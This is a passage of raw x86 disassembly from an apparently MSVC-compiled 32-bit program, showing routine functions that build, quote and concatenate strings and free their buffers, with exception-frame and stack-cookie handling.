  402220:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402224:	8b ec                	mov    %esp,%ebp
  402226:	6a ff                	push   $0xffffffff
  402228:	68 2b 7b 40 00       	push   $0x407b2b
  40222d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402233:	50                   	push   %eax
  402234:	53                   	push   %ebx
  402235:	83 ec 20             	sub    $0x20,%esp
  402238:	56                   	push   %esi
  402239:	57                   	push   %edi
  40223a:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40223f:	33 c5                	xor    %ebp,%eax
  402241:	50                   	push   %eax
  402242:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402245:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40224b:	8b f1                	mov    %ecx,%esi
  40224d:	89 75 ec             	mov    %esi,-0x14(%ebp)
  402250:	8b 43 08             	mov    0x8(%ebx),%eax
  402253:	8b 7b 0c             	mov    0xc(%ebx),%edi
  402256:	50                   	push   %eax
  402257:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40225a:	ff 73 14             	push   0x14(%ebx)
  40225d:	ff 73 10             	push   0x10(%ebx)
  402260:	e8 1b f3 ff ff       	call   0x401580
  402265:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40226c:	8d 4e 14             	lea    0x14(%esi),%ecx
  40226f:	57                   	push   %edi
  402270:	c7 06 1c 95 40 00    	movl   $0x40951c,(%esi)
  402276:	e8 e5 fd ff ff       	call   0x402060
  40227b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40227e:	0f 11 46 2c          	movups %xmm0,0x2c(%esi)
  402282:	66 0f d6 46 3c       	movq   %xmm0,0x3c(%esi)
  402287:	c7 46 2c 00 00 00 00 	movl   $0x0,0x2c(%esi)
  40228e:	33 c0                	xor    %eax,%eax
  402290:	c7 46 3c 00 00 00 00 	movl   $0x0,0x3c(%esi)
  402297:	c7 46 40 07 00 00 00 	movl   $0x7,0x40(%esi)
  40229e:	66 89 46 2c          	mov    %ax,0x2c(%esi)
  4022a2:	0f 11 45 d4          	movups %xmm0,-0x2c(%ebp)
  4022a6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4022a9:	66 0f d6 45 e4       	movq   %xmm0,-0x1c(%ebp)
  4022ae:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4022b1:	c7 45 e8 07 00 00 00 	movl   $0x7,-0x18(%ebp)
  4022b8:	66 89 45 d4          	mov    %ax,-0x2c(%ebp)
  4022bc:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  4022c0:	b8 94 93 40 00       	mov    $0x409394,%eax
  4022c5:	8b 4e 04             	mov    0x4(%esi),%ecx
  4022c8:	85 c9                	test   %ecx,%ecx
  4022ca:	0f 45 c1             	cmovne %ecx,%eax
  4022cd:	83 ec 08             	sub    $0x8,%esp
  4022d0:	8b d4                	mov    %esp,%edx
  4022d2:	8d 48 01             	lea    0x1(%eax),%ecx
  4022d5:	89 02                	mov    %eax,(%edx)
  4022d7:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4022da:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  4022e0:	8a 08                	mov    (%eax),%cl
  4022e2:	40                   	inc    %eax
  4022e3:	84 c9                	test   %cl,%cl
  4022e5:	75 f9                	jne    0x4022e0
  4022e7:	2b 45 ec             	sub    -0x14(%ebp),%eax
  4022ea:	8d 4e 44             	lea    0x44(%esi),%ecx
  4022ed:	89 42 04             	mov    %eax,0x4(%edx)
  4022f0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4022f3:	50                   	push   %eax
  4022f4:	8b d7                	mov    %edi,%edx
  4022f6:	e8 75 00 00 00       	call   0x402370
  4022fb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4022fe:	83 c4 0c             	add    $0xc,%esp
  402301:	83 f9 08             	cmp    $0x8,%ecx
  402304:	72 34                	jb     0x40233a
  402306:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402309:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402310:	8b c2                	mov    %edx,%eax
  402312:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402318:	72 16                	jb     0x402330
  40231a:	8b 50 fc             	mov    -0x4(%eax),%edx
  40231d:	83 c1 23             	add    $0x23,%ecx
  402320:	2b c2                	sub    %edx,%eax
  402322:	83 c0 fc             	add    $0xfffffffc,%eax
  402325:	83 f8 1f             	cmp    $0x1f,%eax
  402328:	76 06                	jbe    0x402330
  40232a:	ff 15 80 91 40 00    	call   *0x409180
  402330:	51                   	push   %ecx
  402331:	52                   	push   %edx
  402332:	e8 85 47 00 00       	call   0x406abc
  402337:	83 c4 08             	add    $0x8,%esp
  40233a:	8b c6                	mov    %esi,%eax
  40233c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40233f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402346:	59                   	pop    %ecx
  402347:	5f                   	pop    %edi
  402348:	5e                   	pop    %esi
  402349:	8b e5                	mov    %ebp,%esp
  40234b:	5d                   	pop    %ebp
  40234c:	8b e3                	mov    %ebx,%esp
  40234e:	5b                   	pop    %ebx
  40234f:	c2 10 00             	ret    $0x10
  402352:	cc                   	int3
  402353:	cc                   	int3
  402354:	cc                   	int3
  402355:	cc                   	int3
  402356:	cc                   	int3
  402357:	cc                   	int3
  402358:	cc                   	int3
  402359:	cc                   	int3
  40235a:	cc                   	int3
  40235b:	cc                   	int3
  40235c:	cc                   	int3
  40235d:	cc                   	int3
  40235e:	cc                   	int3
  40235f:	cc                   	int3
  402360:	83 79 58 10          	cmpl   $0x10,0x58(%ecx)
  402364:	8d 41 44             	lea    0x44(%ecx),%eax
  402367:	72 02                	jb     0x40236b
  402369:	8b 00                	mov    (%eax),%eax
  40236b:	c3                   	ret
  40236c:	cc                   	int3
  40236d:	cc                   	int3
  40236e:	cc                   	int3
  40236f:	cc                   	int3
  402370:	53                   	push   %ebx
  402371:	8b dc                	mov    %esp,%ebx
  402373:	83 ec 08             	sub    $0x8,%esp
  402376:	83 e4 f8             	and    $0xfffffff8,%esp
  402379:	83 c4 04             	add    $0x4,%esp
  40237c:	55                   	push   %ebp
  40237d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  402380:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402384:	8b ec                	mov    %esp,%ebp
  402386:	6a ff                	push   $0xffffffff
  402388:	68 7e 7b 40 00       	push   $0x407b7e
  40238d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402393:	50                   	push   %eax
  402394:	53                   	push   %ebx
  402395:	83 ec 40             	sub    $0x40,%esp
  402398:	a1 04 c0 40 00       	mov    0x40c004,%eax
  40239d:	33 c5                	xor    %ebp,%eax
  40239f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4023a2:	56                   	push   %esi
  4023a3:	57                   	push   %edi
  4023a4:	50                   	push   %eax
  4023a5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4023a8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4023ae:	8b f2                	mov    %edx,%esi
  4023b0:	8b f9                	mov    %ecx,%edi
  4023b2:	89 7d b8             	mov    %edi,-0x48(%ebp)
  4023b5:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  4023b8:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  4023bf:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  4023c5:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  4023cc:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  4023d3:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  4023da:	c7 47 14 0f 00 00 00 	movl   $0xf,0x14(%edi)
  4023e1:	c6 07 00             	movb   $0x0,(%edi)
  4023e4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4023eb:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4023f2:	e8 c0 41 00 00       	call   0x4065b7
  4023f7:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4023fb:	8b c8                	mov    %eax,%ecx
  4023fd:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  402400:	8b c6                	mov    %esi,%eax
  402402:	72 02                	jb     0x402406
  402404:	8b 06                	mov    (%esi),%eax
  402406:	ff 76 10             	push   0x10(%esi)
  402409:	8b d1                	mov    %ecx,%edx
  40240b:	50                   	push   %eax
  40240c:	51                   	push   %ecx
  40240d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402410:	e8 bb 25 00 00       	call   0x4049d0
  402415:	83 c4 0c             	add    $0xc,%esp
  402418:	8b 43 08             	mov    0x8(%ebx),%eax
  40241b:	8b c8                	mov    %eax,%ecx
  40241d:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  402424:	83 78 14 08          	cmpl   $0x8,0x14(%eax)
  402428:	72 02                	jb     0x40242c
  40242a:	8b 08                	mov    (%eax),%ecx
  40242c:	ff 70 10             	push   0x10(%eax)
  40242f:	8b 55 b8             	mov    -0x48(%ebp),%edx
  402432:	51                   	push   %ecx
  402433:	51                   	push   %ecx
  402434:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  402437:	e8 94 25 00 00       	call   0x4049d0
  40243c:	83 c4 0c             	add    $0xc,%esp
  40243f:	33 d2                	xor    %edx,%edx
  402441:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  402445:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402448:	85 c0                	test   %eax,%eax
  40244a:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40244d:	0f 95 c2             	setne  %dl
  402450:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  402453:	8d 14 95 04 00 00 00 	lea    0x4(,%edx,4),%edx
  40245a:	03 d1                	add    %ecx,%edx
  40245c:	03 55 cc             	add    -0x34(%ebp),%edx
  40245f:	03 d0                	add    %eax,%edx
  402461:	39 57 14             	cmp    %edx,0x14(%edi)
  402464:	73 19                	jae    0x40247f
  402466:	8b 77 10             	mov    0x10(%edi),%esi
  402469:	8b cf                	mov    %edi,%ecx
  40246b:	ff 75 b4             	push   -0x4c(%ebp)
  40246e:	2b d6                	sub    %esi,%edx
  402470:	52                   	push   %edx
  402471:	e8 7a 30 00 00       	call   0x4054f0
  402476:	8b 4b 10             	mov    0x10(%ebx),%ecx
  402479:	89 77 10             	mov    %esi,0x10(%edi)
  40247c:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40247f:	8b 77 14             	mov    0x14(%edi),%esi
  402482:	8b c6                	mov    %esi,%eax
  402484:	8b 57 10             	mov    0x10(%edi),%edx
  402487:	2b c2                	sub    %edx,%eax
  402489:	3b c8                	cmp    %eax,%ecx
  40248b:	77 28                	ja     0x4024b5
  40248d:	8d 04 11             	lea    (%ecx,%edx,1),%eax
  402490:	89 47 10             	mov    %eax,0x10(%edi)
  402493:	8b c7                	mov    %edi,%eax
  402495:	83 fe 10             	cmp    $0x10,%esi
  402498:	72 02                	jb     0x40249c
  40249a:	8b 07                	mov    (%edi),%eax
  40249c:	51                   	push   %ecx
  40249d:	ff 73 0c             	push   0xc(%ebx)
  4024a0:	8d 34 10             	lea    (%eax,%edx,1),%esi
  4024a3:	56                   	push   %esi
  4024a4:	e8 1e 55 00 00       	call   0x4079c7
  4024a9:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4024ac:	83 c4 0c             	add    $0xc,%esp
  4024af:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  4024b3:	eb 0f                	jmp    0x4024c4
  4024b5:	51                   	push   %ecx
  4024b6:	ff 73 0c             	push   0xc(%ebx)
  4024b9:	ff 75 b4             	push   -0x4c(%ebp)
  4024bc:	51                   	push   %ecx
  4024bd:	8b cf                	mov    %edi,%ecx
  4024bf:	e8 8c 35 00 00       	call   0x405a50
  4024c4:	8b 4f 14             	mov    0x14(%edi),%ecx
  4024c7:	ba 03 00 00 00       	mov    $0x3,%edx
  4024cc:	8b 77 10             	mov    0x10(%edi),%esi
  4024cf:	8b c1                	mov    %ecx,%eax
  4024d1:	2b c6                	sub    %esi,%eax
  4024d3:	3b d0                	cmp    %eax,%edx
  4024d5:	77 30                	ja     0x402507
  4024d7:	89 7d b8             	mov    %edi,-0x48(%ebp)
  4024da:	8d 04 32             	lea    (%edx,%esi,1),%eax
  4024dd:	89 47 10             	mov    %eax,0x10(%edi)
  4024e0:	8b c7                	mov    %edi,%eax
  4024e2:	83 f9 10             	cmp    $0x10,%ecx
  4024e5:	72 05                	jb     0x4024ec
  4024e7:	8b 07                	mov    (%edi),%eax
  4024e9:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4024ec:	52                   	push   %edx
  4024ed:	03 c6                	add    %esi,%eax
  4024ef:	68 f4 93 40 00       	push   $0x4093f4
  4024f4:	50                   	push   %eax
  4024f5:	e8 cd 54 00 00       	call   0x4079c7
  4024fa:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4024fd:	83 c4 0c             	add    $0xc,%esp
  402500:	c6 44 30 03 00       	movb   $0x0,0x3(%eax,%esi,1)
  402505:	eb 11                	jmp    0x402518
  402507:	52                   	push   %edx
  402508:	68 f4 93 40 00       	push   $0x4093f4
  40250d:	ff 75 b4             	push   -0x4c(%ebp)
  402510:	8b cf                	mov    %edi,%ecx
  402512:	52                   	push   %edx
  402513:	e8 38 35 00 00       	call   0x405a50
  402518:	83 7d d0 10          	cmpl   $0x10,-0x30(%ebp)
  40251c:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40251f:	8b 47 14             	mov    0x14(%edi),%eax
  402522:	0f 43 55 bc          	cmovae -0x44(%ebp),%edx
  402526:	8b 77 10             	mov    0x10(%edi),%esi
  402529:	2b c6                	sub    %esi,%eax
  40252b:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40252e:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  402531:	3b c8                	cmp    %eax,%ecx
  402533:	77 26                	ja     0x40255b
  402535:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  402539:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  40253c:	89 47 10             	mov    %eax,0x10(%edi)
  40253f:	8b c7                	mov    %edi,%eax
  402541:	72 02                	jb     0x402545
  402543:	8b 07                	mov    (%edi),%eax
  402545:	51                   	push   %ecx
  402546:	03 f0                	add    %eax,%esi
  402548:	52                   	push   %edx
  402549:	56                   	push   %esi
  40254a:	e8 78 54 00 00       	call   0x4079c7
  40254f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402552:	83 c4 0c             	add    $0xc,%esp
  402555:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  402559:	eb 0d                	jmp    0x402568
  40255b:	51                   	push   %ecx
  40255c:	52                   	push   %edx
  40255d:	ff 75 b4             	push   -0x4c(%ebp)
  402560:	51                   	push   %ecx
  402561:	8b cf                	mov    %edi,%ecx
  402563:	e8 e8 34 00 00       	call   0x405a50
  402568:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40256c:	0f 84 a4 00 00 00    	je     0x402616
  402572:	8b 4f 14             	mov    0x14(%edi),%ecx
  402575:	ba 04 00 00 00       	mov    $0x4,%edx
  40257a:	8b 77 10             	mov    0x10(%edi),%esi
  40257d:	8b c1                	mov    %ecx,%eax
  40257f:	2b c6                	sub    %esi,%eax
  402581:	3b d0                	cmp    %eax,%edx
  402583:	77 30                	ja     0x4025b5
  402585:	89 7d b8             	mov    %edi,-0x48(%ebp)
  402588:	8d 04 32             	lea    (%edx,%esi,1),%eax
  40258b:	89 47 10             	mov    %eax,0x10(%edi)
  40258e:	8b c7                	mov    %edi,%eax
  402590:	83 f9 10             	cmp    $0x10,%ecx
  402593:	72 05                	jb     0x40259a
  402595:	8b 07                	mov    (%edi),%eax
  402597:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40259a:	52                   	push   %edx
  40259b:	03 c6                	add    %esi,%eax
  40259d:	68 f8 93 40 00       	push   $0x4093f8
  4025a2:	50                   	push   %eax
  4025a3:	e8 1f 54 00 00       	call   0x4079c7
  4025a8:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4025ab:	83 c4 0c             	add    $0xc,%esp
  4025ae:	c6 44 30 04 00       	movb   $0x0,0x4(%eax,%esi,1)
  4025b3:	eb 11                	jmp    0x4025c6
  4025b5:	52                   	push   %edx
  4025b6:	68 f8 93 40 00       	push   $0x4093f8
  4025bb:	ff 75 b4             	push   -0x4c(%ebp)
  4025be:	8b cf                	mov    %edi,%ecx
  4025c0:	52                   	push   %edx
  4025c1:	e8 8a 34 00 00       	call   0x405a50
  4025c6:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  4025ca:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4025cd:	8b 47 14             	mov    0x14(%edi),%eax
  4025d0:	0f 43 55 d4          	cmovae -0x2c(%ebp),%edx
  4025d4:	8b 77 10             	mov    0x10(%edi),%esi
  4025d7:	2b c6                	sub    %esi,%eax
  4025d9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4025dc:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  4025df:	3b c8                	cmp    %eax,%ecx
  4025e1:	77 26                	ja     0x402609
  4025e3:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  4025e7:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  4025ea:	89 47 10             	mov    %eax,0x10(%edi)
  4025ed:	8b c7                	mov    %edi,%eax
  4025ef:	72 02                	jb     0x4025f3
  4025f1:	8b 07                	mov    (%edi),%eax
  4025f3:	51                   	push   %ecx
  4025f4:	03 f0                	add    %eax,%esi
  4025f6:	52                   	push   %edx
  4025f7:	56                   	push   %esi
  4025f8:	e8 ca 53 00 00       	call   0x4079c7
  4025fd:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402600:	83 c4 0c             	add    $0xc,%esp
  402603:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  402607:	eb 0d                	jmp    0x402616
  402609:	51                   	push   %ecx
  40260a:	52                   	push   %edx
  40260b:	ff 75 b4             	push   -0x4c(%ebp)
  40260e:	51                   	push   %ecx
  40260f:	8b cf                	mov    %edi,%ecx
  402611:	e8 3a 34 00 00       	call   0x405a50
  402616:	8b 4f 10             	mov    0x10(%edi),%ecx
  402619:	8b 57 14             	mov    0x14(%edi),%edx
  40261c:	3b ca                	cmp    %edx,%ecx
  40261e:	73 17                	jae    0x402637
  402620:	8d 41 01             	lea    0x1(%ecx),%eax
  402623:	89 47 10             	mov    %eax,0x10(%edi)
  402626:	8b c7                	mov    %edi,%eax
  402628:	83 fa 10             	cmp    $0x10,%edx
  40262b:	72 02                	jb     0x40262f
  40262d:	8b 07                	mov    (%edi),%eax
  40262f:	66 c7 04 08 22 00    	movw   $0x22,(%eax,%ecx,1)
  402635:	eb 0d                	jmp    0x402644
  402637:	6a 22                	push   $0x22
  402639:	ff 75 b4             	push   -0x4c(%ebp)
  40263c:	51                   	push   %ecx
  40263d:	8b cf                	mov    %edi,%ecx
  40263f:	e8 6c 31 00 00       	call   0x4057b0
  402644:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402647:	83 f9 10             	cmp    $0x10,%ecx
  40264a:	72 28                	jb     0x402674
  40264c:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40264f:	41                   	inc    %ecx
  402650:	8b c2                	mov    %edx,%eax
  402652:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402658:	72 10                	jb     0x40266a
  40265a:	8b 50 fc             	mov    -0x4(%eax),%edx
  40265d:	83 c1 23             	add    $0x23,%ecx
  402660:	2b c2                	sub    %edx,%eax
  402662:	83 c0 fc             	add    $0xfffffffc,%eax
  402665:	83 f8 1f             	cmp    $0x1f,%eax
  402668:	77 42                	ja     0x4026ac
  40266a:	51                   	push   %ecx
  40266b:	52                   	push   %edx
  40266c:	e8 4b 44 00 00       	call   0x406abc
  402671:	83 c4 08             	add    $0x8,%esp
  402674:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  402677:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40267e:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  402685:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  402689:	83 f9 10             	cmp    $0x10,%ecx
  40268c:	72 2e                	jb     0x4026bc
  40268e:	8b 55 bc             	mov    -0x44(%ebp),%edx
  402691:	41                   	inc    %ecx
  402692:	8b c2                	mov    %edx,%eax
  402694:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40269a:	72 16                	jb     0x4026b2
  40269c:	8b 50 fc             	mov    -0x4(%eax),%edx
  40269f:	83 c1 23             	add    $0x23,%ecx
  4026a2:	2b c2                	sub    %edx,%eax
  4026a4:	83 c0 fc             	add    $0xfffffffc,%eax
  4026a7:	83 f8 1f             	cmp    $0x1f,%eax
  4026aa:	76 06                	jbe    0x4026b2
  4026ac:	ff 15 80 91 40 00    	call   *0x409180
  4026b2:	51                   	push   %ecx
  4026b3:	52                   	push   %edx
  4026b4:	e8 03 44 00 00       	call   0x406abc
  4026b9:	83 c4 08             	add    $0x8,%esp
  4026bc:	8b c7                	mov    %edi,%eax
  4026be:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4026c1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4026c8:	59                   	pop    %ecx
  4026c9:	5f                   	pop    %edi
  4026ca:	5e                   	pop    %esi
  4026cb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4026ce:	33 cd                	xor    %ebp,%ecx
  4026d0:	e8 a4 43 00 00       	call   0x406a79
  4026d5:	8b e5                	mov    %ebp,%esp
  4026d7:	5d                   	pop    %ebp
  4026d8:	8b e3                	mov    %ebx,%esp
  4026da:	5b                   	pop    %ebx
  4026db:	c3                   	ret
  4026dc:	cc                   	int3
  4026dd:	cc                   	int3
  4026de:	cc                   	int3
  4026df:	cc                   	int3
  4026e0:	55                   	push   %ebp
  4026e1:	8b ec                	mov    %esp,%ebp
  4026e3:	56                   	push   %esi
  4026e4:	8b f1                	mov    %ecx,%esi
  4026e6:	8b 4e 58             	mov    0x58(%esi),%ecx
  4026e9:	83 f9 10             	cmp    $0x10,%ecx
  4026ec:	72 2c                	jb     0x40271a
  4026ee:	8b 46 44             	mov    0x44(%esi),%eax
  4026f1:	41                   	inc    %ecx
  4026f2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4026f8:	72 16                	jb     0x402710
  4026fa:	8b 50 fc             	mov    -0x4(%eax),%edx
  4026fd:	83 c1 23             	add    $0x23,%ecx
  402700:	2b c2                	sub    %edx,%eax
  402702:	83 c0 fc             	add    $0xfffffffc,%eax
  402705:	83 f8 1f             	cmp    $0x1f,%eax
  402708:	0f 87 d9 00 00 00    	ja     0x4027e7
  40270e:	8b c2                	mov    %edx,%eax
  402710:	51                   	push   %ecx
  402711:	50                   	push   %eax
  402712:	e8 a5 43 00 00       	call   0x406abc
  402717:	83 c4 08             	add    $0x8,%esp
  40271a:	c6 46 44 00          	movb   $0x0,0x44(%esi)
  40271e:	c7 46 54 00 00 00 00 	movl   $0x0,0x54(%esi)
  402725:	c7 46 58 0f 00 00 00 	movl   $0xf,0x58(%esi)
  40272c:	8b 4e 40             	mov    0x40(%esi),%ecx
  40272f:	83 f9 08             	cmp    $0x8,%ecx
  402732:	72 32                	jb     0x402766
  402734:	8b 46 2c             	mov    0x2c(%esi),%eax
  402737:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  40273e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402744:	72 16                	jb     0x40275c
  402746:	8b 50 fc             	mov    -0x4(%eax),%edx
  402749:	83 c1 23             	add    $0x23,%ecx
  40274c:	2b c2                	sub    %edx,%eax
  40274e:	83 c0 fc             	add    $0xfffffffc,%eax
  402751:	83 f8 1f             	cmp    $0x1f,%eax
  402754:	0f 87 8d 00 00 00    	ja     0x4027e7
  40275a:	8b c2                	mov    %edx,%eax
  40275c:	51                   	push   %ecx
  40275d:	50                   	push   %eax
  40275e:	e8 59 43 00 00       	call   0x406abc
  402763:	83 c4 08             	add    $0x8,%esp
  402766:	33 c0                	xor    %eax,%eax
  402768:	66 89 46 2c          	mov    %ax,0x2c(%esi)
  40276c:	89 46 3c             	mov    %eax,0x3c(%esi)
  40276f:	c7 46 40 07 00 00 00 	movl   $0x7,0x40(%esi)
  402776:	8b 4e 28             	mov    0x28(%esi),%ecx
  402779:	83 f9 08             	cmp    $0x8,%ecx
  40277c:	72 2e                	jb     0x4027ac
  40277e:	8b 46 14             	mov    0x14(%esi),%eax
  402781:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402788:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40278e:	72 12                	jb     0x4027a2
  402790:	8b 50 fc             	mov    -0x4(%eax),%edx
  402793:	83 c1 23             	add    $0x23,%ecx
  402796:	2b c2                	sub    %edx,%eax
  402798:	83 c0 fc             	add    $0xfffffffc,%eax
  40279b:	83 f8 1f             	cmp    $0x1f,%eax
  40279e:	77 47                	ja     0x4027e7
  4027a0:	8b c2                	mov    %edx,%eax
  4027a2:	51                   	push   %ecx
  4027a3:	50                   	push   %eax
  4027a4:	e8 13 43 00 00       	call   0x406abc
  4027a9:	83 c4 08             	add    $0x8,%esp
  4027ac:	33 c0                	xor    %eax,%eax
  4027ae:	66 89 46 14          	mov    %ax,0x14(%esi)
  4027b2:	89 46 24             	mov    %eax,0x24(%esi)
  4027b5:	8d 46 04             	lea    0x4(%esi),%eax
  4027b8:	c7 46 28 07 00 00 00 	movl   $0x7,0x28(%esi)
  4027bf:	50                   	push   %eax
  4027c0:	c7 06 64 93 40 00    	movl   $0x409364,(%esi)
  4027c6:	ff 15 20 91 40 00    	call   *0x409120
  4027cc:	83 c4 04             	add    $0x4,%esp
  4027cf:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4027d3:	74 0b                	je     0x4027e0
  4027d5:	6a 5c                	push   $0x5c
  4027d7:	56                   	push   %esi
  4027d8:	e8 df 42 00 00       	call   0x406abc
  4027dd:	83 c4 08             	add    $0x8,%esp
  4027e0:	8b c6                	mov    %esi,%eax
  4027e2:	5e                   	pop    %esi
  4027e3:	5d                   	pop    %ebp
  4027e4:	c2 04 00             	ret    $0x4
  4027e7:	ff 15 80 91 40 00    	call   *0x409180
  4027ed:	cc                   	int3
  4027ee:	cc                   	int3
  4027ef:	cc                   	int3
  4027f0:	56                   	push   %esi
  4027f1:	8b f1                	mov    %ecx,%esi
  4027f3:	8b 4e 58             	mov    0x58(%esi),%ecx
  4027f6:	83 f9 10             	cmp    $0x10,%ecx
  4027f9:	72 2c                	jb     0x402827
  4027fb:	8b 46 44             	mov    0x44(%esi),%eax
  4027fe:	41                   	inc    %ecx
  4027ff:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402805:	72 16                	jb     0x40281d
  402807:	8b 50 fc             	mov    -0x4(%eax),%edx
  40280a:	83 c1 23             	add    $0x23,%ecx
  40280d:	2b c2                	sub    %edx,%eax
  40280f:	83 c0 fc             	add    $0xfffffffc,%eax
  402812:	83 f8 1f             	cmp    $0x1f,%eax
  402815:	0f 87 bf 00 00 00    	ja     0x4028da
  40281b:	8b c2                	mov    %edx,%eax
  40281d:	51                   	push   %ecx
  40281e:	50                   	push   %eax
  40281f:	e8 98 42 00 00       	call   0x406abc
  402824:	83 c4 08             	add    $0x8,%esp
  402827:	c6 46 44 00          	movb   $0x0,0x44(%esi)
  40282b:	c7 46 54 00 00 00 00 	movl   $0x0,0x54(%esi)
  402832:	c7 46 58 0f 00 00 00 	movl   $0xf,0x58(%esi)
  402839:	8b 4e 40             	mov    0x40(%esi),%ecx
  40283c:	83 f9 08             	cmp    $0x8,%ecx
  40283f:	72 2e                	jb     0x40286f
  402841:	8b 46 2c             	mov    0x2c(%esi),%eax
  402844:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  40284b:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402851:	72 12                	jb     0x402865
  402853:	8b 50 fc             	mov    -0x4(%eax),%edx
  402856:	83 c1 23             	add    $0x23,%ecx
  402859:	2b c2                	sub    %edx,%eax
  40285b:	83 c0 fc             	add    $0xfffffffc,%eax
  40285e:	83 f8 1f             	cmp    $0x1f,%eax
  402861:	77 77                	ja     0x4028da
  402863:	8b c2                	mov    %edx,%eax
  402865:	51                   	push   %ecx
  402866:	50                   	push   %eax
  402867:	e8 50 42 00 00       	call   0x406abc
  40286c:	83 c4 08             	add    $0x8,%esp
  40286f:	33 c0                	xor    %eax,%eax
  402871:	66 89 46 2c          	mov    %ax,0x2c(%esi)
  402875:	89 46 3c             	mov    %eax,0x3c(%esi)
  402878:	c7 46 40 07 00 00 00 	movl   $0x7,0x40(%esi)
  40287f:	8b 4e 28             	mov    0x28(%esi),%ecx
  402882:	83 f9 08             	cmp    $0x8,%ecx
  402885:	72 2e                	jb     0x4028b5
  402887:	8b 46 14             	mov    0x14(%esi),%eax
  40288a:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402891:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402897:	72 12                	jb     0x4028ab
  402899:	8b 50 fc             	mov    -0x4(%eax),%edx
  40289c:	83 c1 23             	add    $0x23,%ecx
  40289f:	2b c2                	sub    %edx,%eax
  4028a1:	83 c0 fc             	add    $0xfffffffc,%eax
  4028a4:	83 f8 1f             	cmp    $0x1f,%eax
